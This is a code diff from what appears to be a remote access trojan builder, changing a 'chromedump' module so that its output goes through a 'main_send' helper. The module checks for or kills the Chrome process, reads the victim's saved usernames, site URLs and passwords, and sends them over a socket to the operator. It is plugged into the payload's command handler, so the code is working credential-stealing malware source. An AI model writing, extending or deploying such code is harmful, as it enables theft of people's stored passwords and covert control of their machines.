@@ -23,7 +23,7 @@ def chromedump(arg):
         msg += '[+]Killed chrome process'
     elif arg == 'passive':
         if 'chrome.exe'.encode() in check_output(['tasklist']):
-            s.sendall('[-]Chrome is currently running, this module will not do anything until chrome stops'.encode())
+            main_send('[-]Chrome is currently running, this module will not do anything until chrome stops', s)
             return
     else:
         raise IndexError
@@ -52,7 +52,7 @@ def chromedump(arg):
             msg += '\\n   [+]Username : ' + i['username'].encode('ascii','ignore').decode()
             msg += '\\n      URL      : ' + i['origin_url'].encode('ascii','ignore').decode()
             msg += '\\n      Password : ' + i['password'].encode('ascii','ignore').decode()
-    s.sendall(msg.encode())''')
+    main_send(msg, s)''')
         config.logics.append('''
             elif command == "chromedump":
                 chromedump(data)''')
